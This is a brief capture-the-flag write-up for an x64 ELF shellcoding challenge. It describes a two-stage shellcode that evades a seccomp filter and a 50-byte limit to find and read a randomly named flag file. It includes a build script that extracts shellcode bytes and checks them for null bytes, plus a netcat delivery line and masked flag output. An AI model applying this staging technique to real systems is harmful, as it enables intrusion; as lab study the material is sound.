# Writeup of ELF x64 - shellcoding

## The isuuuues

1. We have a program using seccomp mechanisms to prevent us from using certain syscalls.
2. We are limited to a 50 bytes shellcode
3. The file we have to read has a random name

## Solution
1. let's write a shellcode (payload.s) <= 50 bytes that will read from stdin into a region we allocated using mmap
2. let's open ```passwd/.``` directory and parse the result to find the filename
4. open and read "filename"
5. display solution

```
#!/bin/sh

gcc -c payload.s 
if [ $? -ne 0 ]; then
echo "Payload compilation issue!"
exit 1
fi
ld payload.o -o payload
export payload=$(objdump -d ./payload |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s|sed 's/^/"/'|sed 's/$/"/g')                  

gcc -c shellcode.s && ld shellcode.o -o shellcode
shellcode=$(objdump -d ./shellcode |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s|sed 's/^/"/'|sed 's/$/"/g')
if [ $? -ne 0 ]
then
echo "Shellcode compilation issue!"
exit 1
fi
echo $payload | xxd -p | grep 00
if [ $? -eq 0 ]; then
echo "Found 00! in payload"
exit 1
fi
echo $shellcode | xxd -p | grep 00
if [ $? -eq 0 ]; then
echo "Found 00! in shellcode"
exit 1
fi
printf "payload="$payload"\n"
printf "shellcode="$shellcode"\n"%    
```

```
($printf payload; sleep 1; printf $shellcode) | nc ...
...

./passwd/.passwd_nEIomD0POuFC9BLdQX9eQwD2BojIowv2*********************
...
```
